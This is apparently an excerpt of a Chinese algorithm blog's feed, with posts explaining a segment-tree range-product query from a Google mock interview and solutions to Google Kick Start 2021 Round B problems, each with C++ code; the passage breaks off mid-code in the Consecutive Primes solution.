<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>【google】 google </title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/71/</url>
    <content><![CDATA[<h1 id="Google-mock-view"><a href="#Google-mock-view" class="headerlink" title="Google mock view"></a>Google mock view</h1><p>前段时间做了一下<code>google</code>的<code>mock interview</code>,其中有道题目印象深刻。</p>
<h2 id="1-区间查询"><a href="#1-区间查询" class="headerlink" title="1. 区间查询"></a>1. 区间查询</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>给定长度为<code>n</code>的数组<code>A</code>，给定组数$[i,j]$，求以下结果:<br>$$<br>query(i,j) &#x3D; \prod_{k&#x3D;1}^{j-i+1}(A_{i+k-1}^{k})<br>$$<br>所求结果对$10^{9} + 7$取模, 其中满足以下：</p>
<ul>
<li>$i \le j$</li>
<li>$1 \le n \le 10^{5}$</li>
<li>$0 \le A[i] \le 10^{9}$</li>
</ul>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/truncate-sentence">https://leetcode-cn.com/problems/truncate-sentence</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>线段树</p>
</blockquote>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>首先看到类似的求区间的数列我们首先想到的就是用线段树。我们首先用数学分解的方法来将公式进行分解和变换：<br>$$<br>A[i,j] &#x3D; \prod_{k&#x3D;i}^{j}(A_{k}^{k-i+1}) \<br> &#x3D; \prod_{m&#x3D;i}^{s-1}(A_{m}^{m+1-i}) * \prod_{n&#x3D;s}^{j}(A_{n}^{n+1-i}) \<br> &#x3D; \prod_{m&#x3D;i}^{s-1}(A_{m}^{m+1-i}) * \prod_{n&#x3D;s}^{j}(A_{n}^{n+1-s})*(\prod_{n&#x3D;s}^{j}A_{n})^{s-i} \<br>$$<br>由上述变换我们就可以知道如何通过线段树对其进行分解，我们设线段树的每个非叶子节点，包含的范围为$(i,j)$,且包含两个值：<br>$$<br>prod_{(i,j)} &#x3D; \prod_{k&#x3D;i}^{j}A_{k}\<br>val_{(i,j)} &#x3D; \prod_{k&#x3D;i}^{j}A_{k}^{k+1-i}\<br>$$<br>有了上述变换以后我们可以知道线段树的变化，假如本次我们需要查询的区间为$(i,j)$,假设线段从$mid$处断开分为两个子节点，则我们可以知道如下的求和公式：<br>$$<br>prod_{(i,j)} &#x3D; \prod_{k&#x3D;i}^{j}A_{k} &#x3D; \prod_{k&#x3D;i}^{mid}A_{k}*\prod_{k&#x3D;mid+1}^{j}A_{k} \<br>&#x3D; prod_{(i,mid)}<em>prod_{(mid+1,j)} \<br>$$<br>而$val$可以变换如下：<br>$$<br>val_{(i,j)} &#x3D; \prod_{k&#x3D;i}^{j}A_{k}^{k+1-i} &#x3D;  \prod_{k&#x3D;i}^{mid}(A_{k}^{k+1-i}) * \prod_{k&#x3D;mid+1}^{j}(A_{k}^{k+1-i}) \<br> &#x3D;  \prod_{k&#x3D;i}^{mid}(A_{k}^{k+1-i}) * \prod_{k&#x3D;mid+1}^{j}(A_{k}^{k+1-(mid+1)})</em>(\prod_{k&#x3D;mid+1}^{j}A_{k})^{mid+1-i} \<br>&#x3D; val_{(i,mid)}<em>val_{(mid+1,j)}</em>(prod_{(mid+1,j)})^{mid+1-i}<br>$$<br>根据以上变换，我们则可以轻易的用线段树可以在$lg(n)$的时间复杂度内求出所有的查询。</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> MOD = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">long</span> <span class="type">long</span> MAXN = <span class="number">2000000</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">segTreeNode</span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> val;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> prod;</span><br><span class="line">    <span class="type">int</span> l;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHL(x) (x*2)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CHR(x) (x*2+1)</span></span><br><span class="line">segTreeNode tree[MAXN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">fastpow</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x,<span class="type">long</span> <span class="type">long</span> y,<span class="type">long</span> <span class="type">long</span> mod)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ret = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = y; i != <span class="number">0</span>; i &gt;&gt;= <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i&amp;<span class="number">1</span>) ret = (ret*x)%mod;</span><br><span class="line">        x = (x*x)%mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">pushUpTree</span><span class="params">(<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> d = mid - tree[idx].l + <span class="number">1</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pl = tree[<span class="built_in">CHL</span>(idx)].prod;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pr = tree[<span class="built_in">CHR</span>(idx)].prod;</span><br><span class="line">    tree[idx].prod = pl*pr%MOD;</span><br><span class="line">    tree[idx].val = tree[<span class="built_in">CHL</span>(idx)].val*tree[<span class="built_in">CHR</span>(idx)].val*<span class="built_in">fastpow</span>(pr,d,MOD)%MOD;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,vector&lt;<span class="type">int</span>&gt; &amp; arr,<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l &gt; r) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    tree[idx].l = l;</span><br><span class="line">    tree[idx].r = r;</span><br><span class="line">    tree[idx].val = <span class="number">1</span>;</span><br><span class="line">    tree[idx].prod = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l == r)&#123;</span><br><span class="line">        tree[idx].val = arr[l];</span><br><span class="line">        tree[idx].prod = arr[l];</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">buildTree</span>(l,mid,arr,<span class="built_in">CHL</span>(idx));</span><br><span class="line">    <span class="built_in">buildTree</span>(mid+<span class="number">1</span>,r,arr,<span class="built_in">CHR</span>(idx));</span><br><span class="line">    <span class="built_in">pushUpTree</span>(idx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">queryTree</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tree[idx].r &lt; l || tree[idx].l &gt; r) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l &lt;= tree[idx].l &amp;&amp;  tree[idx].r &lt;= r)&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> d = tree[idx].l - l;</span><br><span class="line">        <span class="keyword">return</span> tree[idx].val*<span class="built_in">fastpow</span>(tree[idx].prod,d,MOD)%MOD;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> mid = (tree[idx].l + tree[idx].r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l &gt; mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l,r,<span class="built_in">CHR</span>(idx));</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(r &lt;= mid)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">queryTree</span>(l,r,<span class="built_in">CHL</span>(idx));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> lval = <span class="built_in">queryTree</span>(l,r,<span class="built_in">CHL</span>(idx));</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> rval = <span class="built_in">queryTree</span>(l,r,<span class="built_in">CHR</span>(idx));</span><br><span class="line">        <span class="keyword">return</span> lval*rval%MOD;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    <span class="type">int</span> l,r;</span><br><span class="line">    <span class="built_in">memset</span>(tree,<span class="number">0</span>,<span class="built_in">sizeof</span>(tree));</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cin&gt;&gt;arr[i];</span><br><span class="line">    <span class="built_in">buildTree</span>(<span class="number">0</span>,n<span class="number">-1</span>,arr,<span class="number">1</span>);</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">        l--;</span><br><span class="line">        r--;</span><br><span class="line">        cout&lt;&lt;<span class="built_in">queryTree</span>(l,r,<span class="number">1</span>)&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>【kickstart】 kick start 2021 roundB</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/70/</url>
    <content><![CDATA[<h1 id="google-kick-start-2021-roundB"><a href="#google-kick-start-2021-roundB" class="headerlink" title="google kick start 2021 roundB"></a>google kick start 2021 roundB</h1><p><code>google kickstart</code>的题目质量很高，虽然比不上竞赛的难度，但是都是非常有思考的题目。<br>还是把题解仔细的写一遍，非常喜欢这类型的题目。</p>
<h2 id="Increasing-Substring"><a href="#Increasing-Substring" class="headerlink" title="Increasing Substring"></a>Increasing Substring</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/04/21/2z4NiBxDXLouK5W.png"></p>
<h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a882">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a882</a></p>
<h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p>  暴力统计</p>
</blockquote>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>判断当前字符为结尾的最长递增连续字符串的长度。</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    cin&gt;&gt;s;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; s.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] &gt; s[i<span class="number">-1</span>])&#123;</span><br><span class="line">            ans[i] = ans[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ans[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;ans[i]&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Longest-Progression"><a href="#Longest-Progression" class="headerlink" title="Longest Progression"></a>Longest Progression</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p><img src="https://i.loli.net/2021/04/21/r1f43nB5j2SHFYo.png"></p>
<h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a3a5">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a3a5</a></p>
<h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 滑动窗口</p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol>
<li>在最多只能改变一个元素的情况下，求连续最长的等差序列的长度。典型的滑动窗口，跟力扣的某个题目非常像。我们设<code>left[i]</code>为以第<code>i</code>个元素为结尾的最长连续等差序列的长度，<code>right[i]</code>为以第<code>i</code>个元素为开始的最长连续等差序列的长度，所以我们每次尝试改变第<code>i</code>个元素，然后进行前后可能的元素进行相连即可尝试得到最长的长度。</li>
<li>时间复杂度为$O(n)$,空间复杂度为$O(n)$.</li>
</ol>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">int</span> ans = <span class="number">2</span>;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; left = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; right = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cin&gt;&gt;arr[i];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/*left*/</span></span><br><span class="line">    left[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    left[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">2</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] - arr[i<span class="number">-1</span>] == arr[i<span class="number">-1</span>] - arr[i<span class="number">-2</span>])&#123;</span><br><span class="line">            left[i] = left[i<span class="number">-1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            left[i] = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    right[n<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">    right[n<span class="number">-2</span>] = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = n<span class="number">-3</span>; i &gt;= <span class="number">0</span>; --i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(arr[i] - arr[i+<span class="number">1</span>] == arr[i+<span class="number">1</span>] - arr[i+<span class="number">2</span>])&#123;</span><br><span class="line">            right[i] = right[i+<span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            right[i] = <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = <span class="built_in">max</span>(ans, <span class="number">1</span> + right[<span class="number">1</span>]);</span><br><span class="line">    ans = <span class="built_in">max</span>(ans,<span class="number">1</span> + left[n<span class="number">-2</span>]);</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">        ans = n;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; ++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i+<span class="number">2</span>] - arr[i+<span class="number">1</span>]))&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,right[i+<span class="number">1</span>] + <span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,right[i+<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i == n<span class="number">-2</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i<span class="number">-1</span>] - arr[i<span class="number">-2</span>]))&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,left[i<span class="number">-1</span>] + <span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,left[i<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i+<span class="number">2</span>] - arr[i+<span class="number">1</span>]) &amp;&amp; \</span><br><span class="line">                   arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i<span class="number">-1</span>] - arr[i<span class="number">-2</span>]))&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,left[i<span class="number">-1</span>] + right[i+<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i+<span class="number">2</span>] - arr[i+<span class="number">1</span>]))&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,right[i+<span class="number">1</span>] + <span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(arr[i+<span class="number">1</span>] - arr[i<span class="number">-1</span>] == <span class="number">2</span>*(arr[i<span class="number">-1</span>] - arr[i<span class="number">-2</span>]))&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,left[i<span class="number">-1</span>] + <span class="number">2</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,right[i+<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">                    ans = <span class="built_in">max</span>(ans,left[i<span class="number">-1</span>] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;t&lt;&lt;<span class="string">&quot;: &quot;</span>&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Consecutive-Primes"><a href="#Consecutive-Primes" class="headerlink" title="Consecutive Primes"></a>Consecutive Primes</h2><p>给定数字<code>num</code>,求小等于<code>num</code>且刚好能够被分解为两个连续的质数的乘积的最大元素。</p>
<h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a8e6">https://codingcompetitions.withgoogle.com/kickstart/round/0000000000435a5b/000000000077a8e6</a></p>
<h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 数学问题</p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol>
<li>首先因为题目中限定了元素的大小，我们仔细推算一下，肯定只能由这三个连续的质数的组合，$p_{1} &lt; p_{2} &lt; \sqrt{num} &lt; p_{3}$,最终的结果要么为$p_{1}*p_{2}$,要么为$p_{2}*p_{3}$.</li>
<li>如果数据量非常小的话，我们直接用素数筛查法，即可求出所有的素数，但是因为本题中的数据量非常大，所以我们需要另辟蹊径。仔细查看一下数学知识，<a href="https://en.wikipedia.org/wiki/Prime_gap">素数最大间隔</a>，根据题目中的判断，我们可以猜测两个素数之间的最大间隔也就在几百，所以我们此时就可以用暴力求解，然后同时可以利用素因子快速检测一个数是否为素数因为我们只需要检测$lg(lg(num))$范围的素因子即可。</li>
<li>时间复杂度计算还是太麻烦了，大概在$O(k*lg(lg(num)))$.</li>
</ol>
<h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> visit[<span class="number">100006</span>];</span><br><span class="line">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; prime;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isPrime</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> h = <span class="built_in">sqrt</span>(x);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; prime.<span class="built_in">size</span>() &amp;&amp; prime[i] &lt;= h; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(x%prime[i] == 